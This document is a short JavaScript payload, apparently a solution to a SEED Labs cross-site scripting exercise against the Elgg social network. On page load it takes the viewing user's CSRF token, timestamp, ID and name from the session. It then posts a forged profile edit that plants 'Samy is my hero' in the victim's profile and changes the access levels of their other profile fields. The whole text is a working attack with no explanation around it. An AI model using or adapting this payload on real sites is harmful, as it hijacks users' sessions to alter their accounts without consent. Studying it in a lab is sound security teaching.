<script>
window.onload = function() {

    let Ajax = null;
    let ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
    let token = "&__elgg_token="+elgg.security.token.__elgg_token;
    let victimID = `&guid=${elgg.session.user.guid}`;
    let name = `&name=${elgg.session.user.name}`;
    let fields = "&description=Samy is my hero" + "&accesslevel[description]=2" + "&briefdescription=&accesslevel[briefdescription]=2" +"&location=&accesslevel[location]=2" + "&interests=&accesslevel[interests]=2" + "&skills=&accesslevel[skills]=2" + "&contactemail=&accesslevel[contactemail]=2" + "&phone=&accesslevel[phone]=2" + "&mobile=&accesslevel[mobile]=2" + "&website=&accesslevel[website]=2" + "&twitter=&accesslevel[twitter]=2";
    let content = token + ts + name + fields + victimID;
    const SKIP_ID = 59;
    let sendUrl = "http://www.seed-server.com/action/profile/edit";
    if(elgg.session.user.guid  !==  SKIP_ID){
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendUrl, true);
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}
</script>
